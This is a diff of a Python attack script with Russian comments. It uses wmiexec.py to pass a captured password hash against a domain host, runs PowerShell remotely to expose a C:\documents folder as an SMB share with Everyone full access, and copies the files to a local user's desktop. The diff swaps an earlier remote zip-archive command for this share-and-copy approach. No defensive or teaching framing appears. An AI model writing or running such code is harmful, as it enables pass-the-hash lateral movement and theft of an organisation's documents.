@@ -1,4 +1,4 @@
-# -*- coding: cp1251 -*-
+# -*- coding: utf-8 -*-
 import subprocess
 import re
 import sys
@@ -51,8 +51,21 @@ if user_hash is None:
         print("Пользователь fedorov не найден в полученных хэшах.")
         exit(1)
 
-win_exec = f'wmiexec.py -hashes {user_hash} company/ivanov@10.69.4.5 "powershell.exe Compress-Archive -Path \'C:\\documents\\*\' -DestinationPath \'C:\\documents.zip\'"'
-subprocess.run(win_exec, shell=True)
 
-
+win_exec_smb = f'wmiexec.py -hashes {user_hash} company/ivanov@10.69.4.5 "powershell.exe New-SmbShare -Name "ShareBook" -Path "C:\\documents" -FullAccess "Everyone""'
 subprocess.run(win_exec_smb, shell=True)
+
+
+# Формируем команду PowerShell с использованием raw string literal
+powershell_command = r'Copy-Item -Path "\\10.69.4.5\ShareBook\*" -Destination "C:\Users\fedorov\Desktop" -Recurse'
+
+# Запуск команды через subprocess
+result = subprocess.run(["powershell.exe", "-Command", powershell_command], capture_output=True, text=True)
+
+# Обработка результатов выполнения команды
+if result.returncode == 0:
+    print("PowerShell command executed successfully.")
+    print(result.stdout)
+else:
+    print("Error executing PowerShell command:")
+    print(result.stderr)
